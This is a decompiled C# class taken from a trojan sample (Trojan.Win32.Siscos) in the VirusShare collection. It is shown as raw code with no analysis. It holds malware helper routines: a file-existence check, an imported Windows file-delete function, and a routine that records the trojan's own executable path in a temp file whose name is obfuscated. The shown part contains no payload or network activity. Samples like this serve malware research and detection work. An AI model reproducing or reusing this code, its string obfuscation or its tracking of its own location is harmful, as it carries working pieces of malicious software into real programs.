// Decompiled with JetBrains decompiler
// Type: AvG.stffuff
// Assembly: AvG, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE6413DF-98D6-4E13-8F62-503CC608F960
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Siscos.egt-960843e504290c60dad25d95c76dfe3e1bb44d2b0269a422230476d2d455f21a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace AvG
{
  [StandardModule]
  internal sealed class stffuff
  {
    public static bool FilEx(string sFlP)
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        if (Strings.Len(Strings.Trim(sFlP)) == 0)
        {
          flag = false;
          goto label_9;
        }
        else
        {
          FileSystem.FileLen(sFlP);
          flag = true;
          goto label_9;
        }
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            flag = false;
            goto label_9;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    [DllImport("kernel32", EntryPoint = "DeleteFileA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int Dlfl([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

    public static void WriteTextFile()
    {
      try
      {
        using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + Part.hgdfghdft44546567567("U|wNtmw7~$!")))
        {
          streamWriter.WriteLine(Process.GetCurrentProcess().MainModule.FileName);
          streamWriter.Close();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
